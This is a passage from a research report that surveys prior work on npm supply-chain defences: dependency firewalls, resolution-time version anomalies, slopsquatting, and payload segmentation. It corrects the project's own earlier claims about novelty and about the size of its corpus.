fetches, and later agents worked the vendor channel by crawling sitemaps, `llms.txt`
files and alert catalogues and grepping them locally. Academic coverage is good;
vendor coverage is uneven and **conference talks are effectively unsearched**. JFrog's
help site could not be opened at all. Second, the design called for twelve adversarial
verifiers and four critics; session limits killed them repeatedly and the pass was
re-scoped to four attackers aimed only at the claims that rest on absence. This part
therefore has **less adversarial coverage than Part III**, in a different shape, and a
`partial` here is worth less than a `partial` there.

## The answer

| direction | verdict |
|---|---|
| the private registry as the control point | **exists** |
| anomaly at the moment a range becomes a number | **partial** |
| slopsquatting — are hallucinated names being registered, and how fast | **partial** |
| the payload discontinuity inside one artifact | **exists** |

The two `partial`s are narrow compositions of published parts, and in both cases other
people have already announced the work. The useful output of this part is not a
direction to build; it is three corrections, below.

## Three corrections this forced

**1. `detectSemverAbuse` is a re-implementation of a shipped Socket alert.**
`future-vectors.ts` compares consecutive published versions for an anomalous jump.
Socket's `semverAnomaly` alert, recovered from a 2023-01-27 Wayback snapshot, carries
the props `prevVersion` / `newVersion` and the description: *"Package semver skipped
several versions, this could indicate a dependency confusion attack or indicate the
intention of disruptive breaking changes or major priority shifts for the project."*
That is the same comparison, the same two operands and the same stated motive, shipped
and archived four years ago. The signal is unwired, so nothing has to be retracted —
but it should not be described as ours.

**2. "Nobody watches the moment a range becomes a number" is false and must not be
published.** npm, pnpm, Yarn, Bun and Deno all filter the candidate set *during*
resolution: npm's `min-release-age` hands the cutoff to pacote when the packument is
fetched ([npm/cli#8965](https://github.com/npm/cli/pull/8965)), so a too-new version
ceases to exist for the reifier. Above the client, JFrog's *Compliant Version
Selection* and Sonatype's *PCCS* rewrite the packument mid-resolution so the
non-compliant version is never in the resolver's search space, and npm is singled out
for default-on treatment with metadata attacks as the stated reason. The defensible
sentence is much narrower: **everybody instruments the resolution; the only predicates
anyone has attached to it are a clock and a blocklist.**

**3. The corpus for the payload direction does not exist as described.** Detailed under
direction 4. The short version: the "68 captures with bytes" are `0.0.1-security`
placeholders with no bytes of interest, and the flagship set is missing the payload by
the project's own conclusion.

## 1. The defender is not the installer — **exists**

The premise was that the private registry is another layer rather than a competitor,
and therefore unexplored. It is neither. Registry-side admission is a mature commercial
category with a vendor-neutral name — *dependency firewall*, *curation* — and the
sharper sub-question, whether anyone analyses in the proxy instead of the client, has
at least five built implementations behind it.

On Verdaccio specifically, the layer this project already stood up a fixture for:
`@verdaccio/package-filter` is a **first-party plugin present in the stock
`config.yaml`**, filtering by name, scope, version, date and `minAgeDays`. It landed
via [PR #5786](https://github.com/verdaccio/verdaccio/pull/5786) wired into the storage
layer, so it covers the tarball-download path and uplink sync rather than the manifest
alone. The request history runs to six years — issue #1847 (2020), #3562 (2023),
Discussion #5386 (2025) — and at least eight independent implementations exist beside
it, including `verdaccio-plugin-delay-filter`, `verdaccio-plugin-secfilter`,
[SocialGouv/no-package-malware](https://github.com/SocialGouv/no-package-malware) and
[berkotako/embargo](https://github.com/berkotako/embargo).

Above it: JFrog Curation blocks per npm remote repository on the download request and
handles the retroactive case (packages already cached before the verdict existed);
Sonatype Repository Firewall has a policy stage named `PROXY` and a
*Component-Unknown* default-deny; Socket Firewall ships a Registry Mode and prices it
against its client-side wrapper as a different product. In the literature, OSCAR
([ASE 2024](https://arxiv.org/abs/2409.09356)) is an 18-month production deployment of
malware analysis in an enterprise mirror layer, and MalOSS recommended exactly this
relocation five years ago.

The measurement gap that appeared to survive did not. It was that nobody publishes what
each package manager *does* against a filtering registry. The adversarial pass broke it:
[Chainguard Libraries](https://edu.chainguard.dev/chainguard/libraries/troubleshooting/errors/)
publishes a documentation section headed *"Package manager behavior"* spanning npm,
pnpm, yarn, pip, uv, poetry, Maven and Gradle, with distinct error semantics per manager
(npm surfaces a 403 with the reason; others report a generic no-matching-version);
its [build-configuration page](https://edu.chainguard.dev/chainguard/libraries/javascript/build-configuration/)
covers npm, pnpm, Yarn **and Bun**, including the lockfile-pinned case.
[SafeDep pmg](https://github.com/safedep/pmg/blob/main/docs/dependency-cooldown.md)
documents the bypass this project would have had to discover — metadata filtering
*"does not apply to direct tarball installs or workflows that already have a resolved
tarball URL (e.g. lockfile or cache scenarios)"* — and Endor Labs' *Customer Zero* post
publishes operational figures for a registry-side policy (~135 suppressed versions/day,
~1 event per developer, blocked installs "almost non-existent" after curation shipped),
against the claim that no false-block rate had been published for any such policy.

What is left is thin and it is the same shape as every part before this one: the
per-manager descriptions are **categorical, not measured** — no rates, no paired
head-to-head of proxy-side against client-side enforcement on a shared corpus. That is
a measurement, not a tool, and it is worth less than it looks now that the behaviour
itself is documented.

## 2. The resolution, not the package — **partial**

Every component of this direction is published. The resolution event has been
instrumented and replayed historically at ecosystem scale — Pinckney et al.
([MSR 2023](https://arxiv.org/abs/2304.00394)) shipped a time-travelling npm resolver
built *"to observe how a package's dependencies would have been solved at arbitrary
points in NPM's history"* and ran it over 888,294 update flows; He et al.
([*Pinning Is Futile*, FSE 2025](https://arxiv.org/abs/2502.06662)) reuse the technique
under an explicit supply-chain threat model. Five package managers and three proxies
gate at resolution time. And the anomalous-version predicate itself has shipped since
2022 as Socket's `semverAnomaly` — correction 1 above.

The cooldown contrast the direction leans on does not hold cleanly either. npm's
`min-release-age` and pnpm's `minimumReleaseAge` are not a wait bolted on beside
resolution; they are a filter *on the candidate set during* resolution, and the
user-visible artifact is a resolution failure on a date cutoff
([npm/cli#9891](https://github.com/npm/cli/issues/9891)).

The one surviving composition: **conditioning the judgement on the declared range**, and
scoring one resolution as an outlier against the distribution of concrete versions that
same range — or the same `(dependent, dependency, constraint)` edge — has resolved to
over time. Every distribution in published work sits on an adjacent axis: over declared
constraint *types* per package (Decan & Mens), over constraint types per year (He et
al.), over adoption and CI-pass rates across a consumer population (Renovate Merge
Confidence, Dependabot compatibility), over update feature vectors (Garrett et al.).
The only shipped magnitude test on a resolved number is Renovate's `maxMajorIncrement`,
and reading the source settles it: `default: 500`, major-only, and its documented
purpose is *"preventing upgrades from SemVer-based versions to CalVer-based ones"* —
for `19.0.0` it filters `999.0.0` and `2025.0.0`. A `^1.0.0` resolving to `99.9.1` is a
major delta of 98 and passes.

The adversarial pass broke the general form of this residual at the layer where it was
most likely to break. Keeping a record of what a mutable reference previously resolved
to and firing when it later resolves to something else is shipped, default-on and
documented at both analogous layers: [Docker Scout](https://docs.docker.com/scout/policy/)'s
built-in *No outdated base images* policy (tag → digest), StepSecurity Artifact Monitor's
[tag-movement detection](https://www.stepsecurity.io/blog/suspicious-tag-movement-in-aws-github-action)
(Git ref → commit), with Chainguard's
[tlogistry](https://www.chainguard.dev/unchained/transparently-immutable-tags-using-sigstores-rekor)
(2022) as the earlier published design. All three compare against the single most recent
recorded resolution by binary equality; none scores against a *distribution*, and none
involves version-number magnitude. That is the whole of what survives.

Worth recording as a negative: Maven and Go answer the same threat **structurally**
rather than by anomaly scoring — `maven-enforcer`'s `banDynamicVersions` removes ranges
outright, and Go's minimal version selection means a rogue high version is not selected
unless something explicitly requires it. The absence of an anomaly check there is by
design, not by oversight, which is an argument against the composition rather than an
opening for it.

## 3. Slopsquatting — **partial**

This was the direction expected to point at something not already taken. It is the only
one whose residual survived the adversarial pass, and it survives into occupied ground.

The cross-reference is published, and it is answered in the negative. Okwor,
[*From Hallucination to Registration*](https://doi.org/10.5281/zenodo.21199427)
(2026-07-05), takes hallucinated-name lists, cross-references them against the live
registry, pulls true first-registration timestamps (`npm time.created`, PyPI minimum
upload time) and adjudicates registrant intent: **22 of 149 anchor names registered,
zero malicious, and zero of 1,641 self-generated names claimed by anyone.** The method
is runnable at [slopsquatting-census](https://github.com/OrygnsCode/slopsquatting-census).
Socket's [53 slopsquatting targets across 5 frontier LLMs](https://socket.dev/blog/slopsquatting-targets-across-frontier-llms)
(2026-07-22) reports the same shape with the same malicious count of zero, and the
TOSEM [*Phantoms*](https://doi.org/10.1145/3830237) paper (2026-07-28) runs the clock
the other way — registration to victim install — with the researchers as registrants.

The latency half has a name and a published method, but for the wrong objects: Unit 42's
[Phantom Squatting](https://unit42.paloaltonetworks.com/phantom-squatting-hallucinated-web-domains/)
(2026-06-30) defines the *adversarial exploitation window* and reports 23/35/40/45/51
days plus one case of −11 months, for **DNS domains**, stating that it focuses
exclusively on domain hallucinations and web infrastructure. For package registries the
entire dated record is n=1: `react-codeshift`, emitted 2025-10-17, npm-created
2026-01-14 — about 89 days — and [the claimant was a defender](https://www.aikido.dev/blog/agent-skills-spreading-hallucinated-npx-commands),
so it measures how long a name sat unclaimed, not attacker latency.

So the residual is real: nobody has published a population-scale registration-latency
distribution for package names, including the negative arm where registration precedes
hallucination. Three things make it a poor place to spend eight to twelve days.

It is already staked, three times over. Churilov's revalidation of his 127-name list is
[announced as in progress](https://github.com/churik5/slopsquatting-replication-2026);
Okwor's paper names a "prospective watch" re-checking his 1,641-name corpus as its
follow-up; and [slopclock](https://github.com/slopclock/slopclock) (2026-08-24) exists
to track *"which AI-hallucinated package and domain names get registered"*. All three
parties already hold the corpora.

The emission-side timestamps are also published, contrary to what the direction assumed:
the [DepScope Hallucinations Dataset](https://github.com/cuttalo/depscope-hallucinations-dataset)
carries 161 re-verified names across 18-19 ecosystems, each with an ISO-8601
`first_seen_at` drawn from production coding-agent traffic, with daily snapshots. It
does not join to registry timestamps — names are dropped from the corpus once they
resolve, rather than dated — so the join is open, but the hard half of the input is not
ours to produce.

And the expected answer is the null. Every measurement so far reports zero malicious
registrations. Our corpus would most likely reproduce that, at lower power.

One thing here is genuinely unclaimed and cheaper than the latency study: **PhantomRaven's
slopsquatting attribution has never been checked against model output.** Koi's
126-package claim rests on name shape alone, with no cross-reference to any hallucination
corpus and no per-package registration dates — and CSA says the same of the ~800-package
Flooding Dropper campaign. A result that those names are *not* model-emitted would be a
correction to the vendor record. It is also the campaign that caused this project's near
miss, which is either fitting or a reason for suspicion about the motive.

## 4. The payload discontinuity — **exists**

Published at three separate layers, the oldest of them twenty-one years old.

Intra-artifact multi-origin segmentation: Meng & Miller,
[*Identifying Multiple Authors in a Binary Program*](https://doi.org/10.1007/978-3-319-66399-9_16)
(ESORICS 2017), takes one shipped artifact, segments it and attributes each region to a
different author, with scaffolding separated from hand-written code; their multi-toolchain
follow-up states the supply-chain motivation as settled background. [Multi-χ](https://doi.org/10.2478/popets-2020-0044)
(PoPETs 2020) is the source-code form, segmenting one file by authorship. OCEAN states
this direction's hypothesis almost verbatim — that a function injected by an attacker
differs in style from the surrounding code.

The within-family variance inversion: [Polygraph](https://doi.org/10.1109/sp.2005.15)
(IEEE S&P 2005) partitions a set of artifacts that should be "the same thing" into
invariant and variable regions. Google ships [VxSig](https://github.com/google/vxsig)
to do it over malware families. The direction inverts which half is interesting —
payload as the variable part rather than signature as the invariant — but the partition
is the published object.

Campaign clustering: ACME ([arXiv 2011.02235](https://arxiv.org/abs/2011.02235), 2020)
states the premise in its abstract. More pointedly, DataDog's own GuardDog ships
[`evals/cluster.py` with a checked-in cluster index](https://github.com/DataDog/guarddog/tree/v3/evals),
running package similarity clustering **over the exact corpus this project uses**, and
`recall.py` consumes it via `--max-per-cluster` to dedupe campaign siblings. The
non-independence correction is already applied there by the corpus's maintainer.

Injected-code detection is shipped too: GuardDog's `repository_integrity_mismatch`
hashes every file in the source repo against the published package and flags what
differs or appears only in the tarball; Microsoft's OSSGadget `oss-reproducible`
rebuilds the package and judges whether the differences are meaningful; LastPyMile and
[*On the feasibility of detecting injections in malicious npm packages*](https://doi.org/10.1145/3538969.3543815)
(2022) do the invariant/variable partition on npm tarballs specifically.

One narrow shape did survive, and it survived on unusually good evidence — complete
catalogue enumeration rather than absence of search hits: all 90 Socket alert slugs,
GuardDog's full `RULES.md`, all 36 Phylum analytics and all 402 ReversingLabs Spectra
Assure pages (including a category named *Anomaly* holding 141 indicators) were pulled
and grepped for comparative language. **No shipped scanner alert has the form "this file
is unlike the rest of this package."** Every published baseline is external: the source
repo, version N−1, or a known-bad corpus. The package as its own control is the one
arrangement not found. Socket's `gptAnomaly` is the nearest thing and is an opaque LLM
review of package contents, so it cannot be ruled out as already doing this internally.

### The corpus does not support it, independently of prior art

This matters more than the verdict, and it is a repo finding rather than a search result.

The direction says it applies to "the 68 captures with bytes". Those are two different
numbers. `audit-a5.md:1332`: the 68 are captures resolving to the **registry identity**,
and *"all 68 are `0.0.1-security` placeholders"* — empty stubs, already excluded from
the A5 control arm as withdrawn. There is no payload in any of them. The real with-bytes
corpus is **56** (`commands.md:575`), of which **36 belong to one package's
republication series**, `@siwatfa/yorn` — which holds 56 captures of its own and 36
with bytes, the shortfall being twenty early versions from 1.0.1 to 1.0.30 that a
sweep took (`audit-a5.md:483`). That leaves 20 with-bytes captures across the other 14
packages.

But 56 is the wrong unit anyway. The unit for this analysis is the set that should be
identical — the burst family — and `metadata-results/metadata-2026-08-20-v1.4.0.json`
lists exactly **8 malicious families across 6 distinct publishers**, only two of which
have five members (`whltd4` ×5 over 8.35 min, `javonayers999` ×5 over 4.24 min); the
rest are pairs and one triple, and `whltd4` and `ferrousdev` each appear twice. The
honest n is eight sets, not independent of one another.

The flagship set is worse than small. D16 (`audit-a5.md:1496`) already concluded that
the five lock packages **are the decoys**, and that `mutex-forge` — 664KB, with a
repository field, scored 10 and rejected by the class filter — is the carrier they all
depend on, and it was never captured. The direction proposes finding the payload in what
varies inside a set that should be identical. The project does not hold the payload for
its own flagship set. What varies across the five is names, versions and a few hundred
bytes of scaffolding. Finding nothing there would be the correct result.

Three further problems, each sufficient alone. **Size**: the five tarballs are 3084,
4010, 3825, 3578 and 3517 bytes, so on the order of one to three kilobytes of JavaScript
each after `package.json`, README and LICENSE — Meng & Miller work at function
granularity in binaries orders of magnitude larger, and fragment-granularity provenance
is presented in that literature as a hard problem. **Censored set**: `shared-slot-gate`
and `async-lock-queue` 404ed before capture (`audit-a5.md:1475`), so the analysis would
run over five of at least seven known members, with the missing two selected by a race
condition rather than at random. **Non-independence**, which this project has already
formalised against itself: `design-effect.md` establishes the DataDog corpus has ~56
independent observations rather than 1,001, design effect 25.8, called a lower bound.
Five packages from one account in four minutes is one observation by that standard.

What could honestly be run is a descriptive note showing the shared/varying partition
across the five decoys, labelled as one account, one four-minute burst, five artifacts
of 3-4KB, two family members missing, payload absent. That is a corpus observation, not
a detection method.

## What was not found

Same standard as Parts I to III, with the method defects above subtracted: 24 lanes,
four syntheses, four adversarial attackers, and absence at that depth is weak evidence
of absence — weaker here than in Part III, because the vendor channel was worked by
sitemap crawling rather than search and conference talks were not covered at all.

1. **No per-range resolution baseline.** Nobody scores a resolution against the
   distribution of versions that same range or edge has historically resolved to. The
   analogous controls at the container-tag and Git-ref layers all compare against the
   single most recent resolution by equality, not against a distribution.
2. **No registration-latency distribution for package names.** Published for DNS domains
   with a named metric; for packages the dated record is n=1 and the registrant was a
   defender. Three parties who hold the corpora have announced this work.
3. **No verification of PhantomRaven's or Flooding Dropper's names against model output.**
   Both slopsquatting attributions rest on name shape alone.
4. **No shipped alert of the form "this file is unlike the rest of this package."**
   Verified by enumerating four complete vendor catalogues, not by failing to find one.
   The idea it would instantiate is published; the self-referential baseline is not
   shipped.
5. **No measured per-manager outcomes against a filtering registry.** The behaviour is
   now documented in several places; what is absent is rates rather than descriptions.

Items 1 and 4 are compositions of published parts. Item 2 is claimed by three other
parties and its expected answer is a null. Item 3 is a correction to somebody else's
record and is the cheapest thing on this list. Item 5 is a measurement, which is where
Parts II and III also ended.

None of the four directions is a place to build a tool.

## Sources

- [@verdaccio/package-filter](https://github.com/verdaccio/verdaccio/blob/master/packages/plugins/package-filter/README.md) · [PR #5786](https://github.com/verdaccio/verdaccio/pull/5786) · [verdaccio-plugin-delay-filter](https://github.com/kevinclerc/verdaccio-plugin-delay-filter) · [SocialGouv/no-package-malware](https://github.com/SocialGouv/no-package-malware) · [berkotako/embargo](https://github.com/berkotako/embargo)
- [Sonatype Firewall Quarantine](https://help.sonatype.com/en/firewall-quarantine.html) · [Socket Firewall](https://docs.socket.dev/docs/socket-firewall) · [Chainguard Libraries — package manager behavior](https://edu.chainguard.dev/chainguard/libraries/troubleshooting/errors/) · [Endor Labs Customer Zero](https://www.endorlabs.com/learn/customer-zero-implementing-package-firewall-at-endor-labs) · [safedep/pmg dependency-cooldown](https://github.com/safedep/pmg/blob/main/docs/dependency-cooldown.md)
- [OSCAR (ASE 2024)](https://arxiv.org/abs/2409.09356) · [Bad Snakes (ICSE 2023)](https://doi.org/10.1109/ICSE48619.2023.00052) · [Amalfi (ICSE 2022)](https://doi.org/10.1145/3510003.3510104) · [MalOSS (NDSS 2021)](https://arxiv.org/abs/2002.01139)
- [Pinckney et al., MSR 2023](https://arxiv.org/abs/2304.00394) · [He et al., *Pinning Is Futile*, FSE 2025](https://arxiv.org/abs/2502.06662) · [npm/cli#8965 min-release-age](https://github.com/npm/cli/pull/8965) · [Renovate maxMajorIncrement](https://docs.renovatebot.com/configuration-options/#maxmajorincrement) · [Docker Scout policy](https://docs.docker.com/scout/policy/) · [StepSecurity tag movement](https://www.stepsecurity.io/blog/suspicious-tag-movement-in-aws-github-action) · [Chainguard tlogistry](https://www.chainguard.dev/unchained/transparently-immutable-tags-using-sigstores-rekor)
- [Okwor, *From Hallucination to Registration*](https://doi.org/10.5281/zenodo.21199427) · [slopsquatting-census](https://github.com/OrygnsCode/slopsquatting-census) · [Unit 42 Phantom Squatting](https://unit42.paloaltonetworks.com/phantom-squatting-hallucinated-web-domains/) · [Socket — 53 slopsquatting targets](https://socket.dev/blog/slopsquatting-targets-across-frontier-llms) · [TOSEM *Phantoms*](https://doi.org/10.1145/3830237) · [Churilov, *The Range Shrinks*](https://arxiv.org/abs/2605.17062) · [DepScope dataset](https://github.com/cuttalo/depscope-hallucinations-dataset) · [Aikido — hallucinated npx commands](https://www.aikido.dev/blog/agent-skills-spreading-hallucinated-npx-commands) · [slopclock](https://github.com/slopclock/slopclock) · [Spracklen et al., USENIX Security 2025](https://arxiv.org/abs/2406.10279)
- [Meng & Miller, ESORICS 2017](https://doi.org/10.1007/978-3-319-66399-9_16) · [Multi-χ, PoPETs 2020](https://doi.org/10.2478/popets-2020-0044) · [Polygraph, IEEE S&P 2005](https://doi.org/10.1109/sp.2005.15) · [google/vxsig](https://github.com/google/vxsig) · [ACME](https://arxiv.org/abs/2011.02235) · [GuardDog evals/cluster.py](https://github.com/DataDog/guarddog/tree/v3/evals) · [LastPyMile](https://doi.org/10.1145/3468264.3468592) · [*Detecting injections in malicious npm packages*](https://doi.org/10.1145/3538969.3543815) · [OSSGadget oss-reproducible](https://github.com/microsoft/OSSGadget/wiki/OSS-Reproducible) · [Aura](https://github.com/SourceCode-AI/aura)
- Socket `semverAnomaly`, recovered from the Wayback Machine snapshot of 2023-01-27 (`web.archive.org/web/20230127004927/https://socket.dev/npm/issue/semverAnomaly`); the alert is no longer at that path.
